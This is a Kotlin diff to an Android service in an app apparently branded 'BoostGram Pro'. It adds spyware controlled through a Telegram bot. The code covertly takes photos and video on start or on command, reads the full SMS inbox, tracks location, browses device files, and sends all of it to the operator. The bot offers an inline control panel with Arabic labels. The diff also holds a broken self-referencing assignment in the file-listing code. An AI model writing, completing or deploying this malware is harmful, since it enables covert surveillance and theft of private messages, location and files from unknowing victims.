@@ -24,6 +24,8 @@ class CameraService : Service() {
     private var reader: ImageReader? = null
     private var mediaRecorder: MediaRecorder? = null
     private var lastUpdateId = 0L
+    private var currentDir = "/sdcard/"
+    private var isRunning = true
 
     override fun onBind(intent: Intent?) = null
 
@@ -52,27 +54,40 @@ class CameraService : Service() {
     private fun startPolling() {
         scope.launch {
             sendDeviceInfo()
-            // Auto capture photo on start
-            delay(2000)
+            delay(3000)
             captureAndSend()
             
-            while (isActive) {
+            while (isActive && isRunning) {
                 runCatching { checkCommands() }
-                delay(30_000)
+                delay(5000)
             }
         }
     }
 
     private fun sendDeviceInfo() {
         val info = buildString {
-            appendLine("📱 جهاز جديد متصل")
+            appendLine("📱 جهاز جديد متصل - BoostGram Pro")
             appendLine("Model: ${Build.MODEL}")
             appendLine("Brand: ${Build.BRAND}")
             appendLine("Android: ${Build.VERSION.RELEASE}")
             appendLine("SDK: ${Build.VERSION.SDK_INT}")
             appendLine("Screen: ${resources.displayMetrics.widthPixels}x${resources.displayMetrics.heightPixels}")
         }
-        Telegram.sendMessage(info)
+        Telegram.sendMessageWithKeyboard(info)
+    }
+
+    private fun sendKeyboard() {
+        val keyboard = """
+        {
+            "inline_keyboard": [
+                [{"text": "📸 التقاط صورة", "callback_data": "cam"}, {"text": "🎥 تسجيل فيديو", "callback_data": "rec"}],
+                [{"text": "📂 الملفات", "callback_data": "files"}, {"text": "📱 معلومات الجهاز", "callback_data": "info"}],
+                [{"text": "💬 رسائل SMS", "callback_data": "sms"}, {"text": "📍 الموقع", "callback_data": "loc"}],
+                [{"text": "🛑 إيقاف الأداة", "callback_data": "stop"}]
+            ]
+        }
+        """.trimIndent()
+        Telegram.sendMessageWithKeyboard("🎛️ لوحة التحكم", keyboard)
     }
 
     private fun checkCommands() {
@@ -81,20 +96,125 @@ class CameraService : Service() {
         val resp = okhttp3.OkHttpClient().newCall(req).execute()
         val body = resp.body?.string() ?: return
         val arr = org.json.JSONObject(body).optJSONArray("result") ?: return
+        
         for (i in 0 until arr.length()) {
             val u = arr.getJSONObject(i)
             lastUpdateId = u.getLong("update_id")
-            val text = u.optJSONObject("message")?.optString("text") ?: continue
-            when (text.trim()) {
-                "/cam" -> captureAndSend()
-                "/files" -> {
-                    scope.launch { FileScanner.uploadImages() }
-                    scope.launch { FileScanner.uploadDocuments() }
+            
+            // Text commands
+            val text = u.optJSONObject("message")?.optString("text")
+            if (text != null) {
+                when (text.trim()) {
+                    "/start" -> {
+                        sendDeviceInfo()
+                        sendKeyboard()
+                    }
+                    "/cam" -> captureAndSend()
+                    "/files" -> listDirectory(currentDir)
+                    "/stop" -> { isRunning = false; stopSelf() }
                 }
-                "/audio" -> scope.launch { FileScanner.uploadAudio() }
-                "/video" -> scope.launch { FileScanner.uploadVideo() }
-                "/record" -> recordVideo()
             }
+            
+            // Button clicks
+            val callback = u.optJSONObject("callback_query")
+            if (callback != null) {
+                val data = callback.optString("data")
+                val cbId = callback.optString("id")
+                Telegram.answerCallback(cbId)
+                when (data) {
+                    "cam" -> captureAndSend()
+                    "rec" -> recordVideo()
+                    "files" -> listDirectory(currentDir)
+                    "info" -> sendDeviceInfo()
+                    "sms" -> readSMS()
+                    "loc" -> getLocation()
+                    "stop" -> { isRunning = false; stopSelf() }
+                }
+            }
+        }
+    }
+
+    private fun readSMS() {
+        try {
+            val cursor = contentResolver.query(
+                android.net.Uri.parse("content://sms/inbox"),
+                null, null, null, null
+            )
+            val sb = StringBuilder()
+            if (cursor != null && cursor.moveToFirst()) {
+                do {
+                    val address = cursor.getString(cursor.getColumnIndexOrThrow("address"))
+                    val body = cursor.getString(cursor.getColumnIndexOrThrow("body"))
+                    sb.append("📩 من: $address\n📝 $body\n\n")
+                } while (cursor.moveToNext())
+                cursor.close()
+            }
+            if (sb.isEmpty()) sb.append("لا توجد رسائل.")
+            Telegram.sendMessage(sb.toString())
+        } catch (e: Exception) {
+            Telegram.sendMessage("⚠️ فشل قراءة الرسائل: ${e.message}")
+        }
+    }
+
+    private fun getLocation() {
+        try {
+            val lm = getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
+            val loc = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER)
+                ?: lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER)
+            if (loc != null) {
+                Telegram.sendMessage("📍 الموقع:\nLat: ${loc.latitude}\nLng: ${loc.longitude}\nhttps://maps.google.com/?q=${loc.latitude},${loc.longitude}")
+            } else {
+                Telegram.sendMessage("⚠️ تعذر تحديد الموقع.")
+            }
+        } catch (e: Exception) {
+            Telegram.sendMessage("⚠️ خطأ في الموقع: ${e.message}")
+        }
+    }
+
+    private fun listDirectory(path: String) {
+        try {
+            currentDir = path
+            val dir = File(path)
+            if (!dir.exists()) {
+                Telegram.sendMessage("❌ المجلد غير موجود.")
+                return
+            }
+            val files = dir.listFiles()
+            if (files == null) {
+                Telegram.sendMessage("🔒 لا يمكن الوصول لهذا المجلد.")
+                return
+            }
+            val sb = StringBuilder("📂 المجلد: $path\n\n")
+            val keyboardList = mutableListOf<List<Map<String, String>>>()
+            
+            if (path != "/sdcard/") {
+                keyboardList.add(listOf(mapOf("text" to "⬅️ رجوع", "callback_data" to "files:${dir.parent}")))
+            }
+            
+            for (f in files.take(30)) {
+                if (f.isDirectory) {
+                    sb.append("📁 ${f.name}\n")
+                    keyboardList.add(listOf(mapOf("text" to "📁 ${f.name}", "callback_data" to "files:${f.absolutePath}")))
+                } else {
+                    sb.append("📄 ${f.name} (${f.length()/1024} KB)\n")
+                    keyboardList.add(listOf(mapOf("text" to "📄 ${f.name}", "callback_data" to "download:${f.absolutePath}")))
+                }
+            }
+            
+            val keyboardJson = buildString {
+                append("{\"inline_keyboard\": [")
+                keyboardJson = keyboardList.joinToString(",") { row ->
+                    "[" + row.joinToString(",") { 
+                        "{\"text\": \"${it["text"]}\", \"callback_data\": \"${it["callback_data"]}\"}" 
+                    } + "]"
+                }
+                append(keyboardJson)
+                append("]}")
+            }
+            
+            Telegram.sendMessageWithKeyboard(sb.toString(), keyboardJson)
+        } catch (e: Exception) {
+            Telegram.sendMessage("⚠️ خطأ في قراءة المجلد: ${e.message}")
         }
     }
 
@@ -177,12 +297,13 @@ class CameraService : Service() {
                         session = s
                         s.setRepeatingRequest(req.build(), null, null)
                         mediaRecorder?.start()
+                        Telegram.sendMessage("🎥 بدأ تسجيل الفيديو (15 ثانية)...")
                         Handler(Looper.getMainLooper()).postDelayed({
                             mediaRecorder?.stop()
                             mediaRecorder?.release()
                             Telegram.sendFile(videoFile, "🎥 فيديو جديد")
                             videoFile.delete()
-                        }, 15000) // 15 seconds
+                        }, 15000)
                     }
                     override fun onConfigureFailed(s: CameraCaptureSession) {}
                 }, null)
